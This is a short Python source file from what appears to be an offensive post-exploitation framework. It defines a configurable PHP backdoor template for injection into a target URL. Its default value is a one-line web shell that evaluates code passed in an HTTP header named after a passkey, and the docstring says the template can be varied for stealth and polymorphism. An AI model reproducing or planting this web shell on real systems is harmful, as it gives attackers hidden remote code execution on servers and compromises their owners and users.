import objects
import datatypes


class BACKDOOR:
    """
    This settings allows overriding default template
    of the backdoor to inject in target URL in
    order to improve stealth and polymorphism.

    Global behavior of the php backdoor sould remain
    the same in order to work properly.
    It must evaluate the HTTP_%%PASSKEY%% header,
    which is generated with the name of the
    $PASSKEY setting.

    NOTE: If you do not understand what you're doing,
          please do not change this setting.
    """
    type = objects.settings.RandLineBuffer

    def setter(self, value):
        if value.find("%%PASSKEY%%") < 0:
            raise ValueError("shall contain %%PASSKEY%% string")
        return datatypes.PhpCode(value)

    def default_value(self):
        raw_value = "@eval($_SERVER['HTTP_%%PASSKEY%%']);"
        return self.setter(raw_value)
